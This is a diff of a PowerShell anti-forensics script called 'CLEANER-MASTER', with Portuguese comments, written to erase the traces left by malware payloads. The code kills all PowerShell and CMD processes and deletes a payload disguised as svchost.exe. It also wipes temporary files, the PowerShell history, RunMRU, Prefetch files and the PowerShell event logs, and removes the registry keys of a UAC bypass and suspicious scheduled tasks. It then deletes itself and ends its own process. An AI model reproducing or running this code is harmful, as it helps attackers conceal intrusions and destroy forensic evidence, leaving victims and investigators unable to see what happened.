@@ -1,33 +1,46 @@
 <#
 .SYNOPSIS
-    CLEANER-MASTER.ps1 – Remove todos os rastros dos payloads.
-    Executado com privilégios de administrador, encerra processos,
-    apaga arquivos temporários, limpa logs e histórico, e se autodestrói.
+    CLEANER-MASTER v2 – Encerra TODOS os processos PowerShell/CMD,
+    remove arquivos, logs, histórico, chaves de registro e se autodestrói.
 #>
 
 # ===== CONFIGURAÇÕES =====
 $tempDir      = $env:TEMP
-$payloadName  = "svchost.exe"                    # Nome furtivo do executável
-$resultsDir   = Join-Path $tempDir "results"     # Pasta de resultados
-$flagFile     = Join-Path $tempDir "END_ALL.txt" # Flag da distração (se existir)
+$payloadName  = "svchost.exe"
+$resultsDir   = Join-Path $tempDir "results"
+$flagFile     = Join-Path $tempDir "END_ALL.txt"
 
-# ===== 1. ENCERRAR PROCESSOS SUSPEITOS =====
-Write-Host "[CLEANER] Encerrando processos..."
-$processNames = @("svchost", "powershell", "cmd", "mshta", "wscript", "cscript")
-foreach ($procName in $processNames) {
-    Get-Process -Name $procName -ErrorAction SilentlyContinue | ForEach-Object {
-        $procPath = (Get-CimInstance Win32_Process -Filter "ProcessId = $($_.Id)").ExecutablePath
-        $cmdLine  = (Get-CimInstance Win32_Process -Filter "ProcessId = $($_.Id)").CommandLine
-        # Mata apenas processos rodando do TEMP ou com características de payload (Hidden, iex)
-        if ($procPath -like "*$tempDir*" -or $cmdLine -like "*Hidden*" -or $cmdLine -like "*iex*") {
-            Write-Host "[CLEANER] Matando $($_.Name) (PID $($_.Id)): $procPath"
-            Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
-        }
+# Guarda o PID do script atual (será morto somente no final)
+$myPid = $PID
+
+# ===== 1. ENCERRAR TODOS OS POWERSHELL E CMD (exceto o atual temporariamente) =====
+Write-Host "[CLEANER] Encerrando TODAS as instâncias do PowerShell e CMD..."
+
+# Lista de processos a matar (inclui o próprio script, mas protegemos o atual)
+$targetProcesses = @("powershell", "cmd")
+
+# Mata todos os processos com esses nomes, exceto o PID do script
+foreach ($procName in $targetProcesses) {
+    Get-Process -Name $procName -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne $myPid } | ForEach-Object {
+        Write-Host "[CLEANER] Matando $($_.Name) (PID $($_.Id))"
+        Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
+    }
+}
+
+# Aguarda um pouco para garantir que os processos foram finalizados
+Start-Sleep -Seconds 2
+
+# Se ainda sobrar algum (travado), usa taskkill como força bruta
+foreach ($procName in $targetProcesses) {
+    $remaining = Get-Process -Name $procName -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne $myPid }
+    if ($remaining) {
+        Write-Host "[CLEANER] Ainda restam processos $procName, usando taskkill /f..."
+        & taskkill /f /im "$procName.exe" /t 2>$null
     }
 }
 
 # ===== 2. REMOVER ARQUIVOS E PASTAS =====
-Write-Host "[CLEANER] Removendo arquivos..."
+Write-Host "[CLEANER] Removendo arquivos e pastas..."
 $pathsToDelete = @(
     Join-Path $tempDir $payloadName,
     $resultsDir,
@@ -35,10 +48,12 @@ $pathsToDelete = @(
     "$tempDir\*.zip",
     "$tempDir\*.ps1",
     "$tempDir\*.exe",
+    "$tempDir\*.txt",
+    "$tempDir\*.csv",
+    "$tempDir\*.json",
     "$env:LOCALAPPDATA\Temp\*",
     "$env:WINDIR\Temp\*"
 )
-
 foreach ($path in $pathsToDelete) {
     if (Test-Path $path) {
         Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue
@@ -47,41 +62,33 @@ foreach ($path in $pathsToDelete) {
 }
 
 # ===== 3. LIMPAR HISTÓRICO DO POWERSHELL =====
-Write-Host "[CLEANER] Limpando histórico do PowerShell..."
 $psHistoryPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 if (Test-Path $psHistoryPath) {
     Clear-Content $psHistoryPath -Force
-    Write-Host "[CLEANER] Histórico PSReadLine limpo."
+    Write-Host "[CLEANER] Histórico PSReadLine apagado."
 }
 
-# Remove variáveis de ambiente que possam conter comandos
-Remove-Item Env:\PSExecutionPolicyPreference -ErrorAction SilentlyContinue
-
-# ===== 4. LIMPAR REGISTROS DO SISTEMA =====
-Write-Host "[CLEANER] Limpando registros..."
-# RunMRU (histórico do Executar)
+# ===== 4. LIMPAR RUNMRU (EXECUTAR) =====
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
 
-# Prefetch (requer admin)
+# ===== 5. LIMPAR PREFETCH =====
 if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     Get-ChildItem "$env:SystemRoot\Prefetch" -Filter "*.pf" | Where-Object {
-        $_.Name -like "*SVCHOST*" -or $_.Name -like "*POWERSHELL*" -or $_.Name -like "*CMD*"
+        $_.Name -like "*POWERSHELL*" -or $_.Name -like "*CMD*" -or $_.Name -like "*SVCHOST*"
     } | Remove-Item -Force -ErrorAction SilentlyContinue
-    Write-Host "[CLEANER] Arquivos Prefetch removidos."
+    Write-Host "[CLEANER] Prefetch limpo."
 }
 
-# ===== 5. LIMPAR LOGS DE EVENTOS =====
+# ===== 6. LIMPAR LOGS DE EVENTOS (se admin) =====
 if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     $logNames = @("Windows PowerShell", "Microsoft-Windows-PowerShell/Operational")
     foreach ($log in $logNames) {
-        try {
-            wevtutil cl $log 2>$null
-            Write-Host "[CLEANER] Log '$log' limpo."
-        } catch { }
+        try { wevtutil cl $log 2>$null } catch {}
     }
+    Write-Host "[CLEANER] Logs do PowerShell limpos."
 }
 
-# ===== 6. REMOVER CHAVES DE REGISTRO DO BYPASS UAC =====
+# ===== 7. REMOVER CHAVES DE REGISTRO DO BYPASS UAC =====
 $regPaths = @(
     "HKCU:\Software\Classes\ms-settings",
     "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
@@ -93,26 +100,28 @@ foreach ($rp in $regPaths) {
     }
 }
 
-# ===== 7. LIMPAR CACHES DE REDE =====
-Write-Host "[CLEANER] Limpando caches de rede..."
+# ===== 8. LIMPAR CACHES DE REDE =====
 ipconfig /flushdns | Out-Null
 arp -d * | Out-Null
 
-# ===== 8. REMOVER TAREFAS AGENDADAS SUSPEITAS =====
+# ===== 9. REMOVER TAREFAS AGENDADAS SUSPEITAS =====
 Get-ScheduledTask | Where-Object { $_.TaskPath -like "*TEMP*" -or $_.TaskName -like "*cleaner*" -or $_.TaskName -like "*payload*" } | ForEach-Object {
     Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
-    Write-Host "[CLEANER] Tarefa agendada removida: $($_.TaskName)"
 }
 
-# ===== 9. AUTO-REMOÇÃO DO PRÓPRIO SCRIPT =====
+# ===== 10. AUTO-REMOÇÃO DO SCRIPT =====
 $scriptPath = $MyInvocation.MyCommand.Path
 if ($scriptPath) {
+    # Tenta remover o arquivo do script atual
     Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
     Write-Host "[CLEANER] Script auto-removido."
 }
 
-# ===== 10. ENCERRAMENTO FORÇADO DO POWERSHELL =====
+# ===== 11. ENCERRAMENTO FINAL – MATA O PRÓPRIO PROCESSO =====
+Write-Host "[CLEANER] Limpeza completa. Encerrando este PowerShell..."
 [GC]::Collect()
-[GC]::WaitForPendingFinalizers()
-Write-Host "[CLEANER] Limpeza concluída. Fechando..."
-Stop-Process -Id $PID -Force
+Start-Sleep -Seconds 1
+# Mata o processo atual e, de brinde, qualquer outro powershell que tenha escapado
+Stop-Process -Id $myPid -Force
+# Caso falhe, tenta via taskkill
+& taskkill /f /pid $myPid /t 2>$null
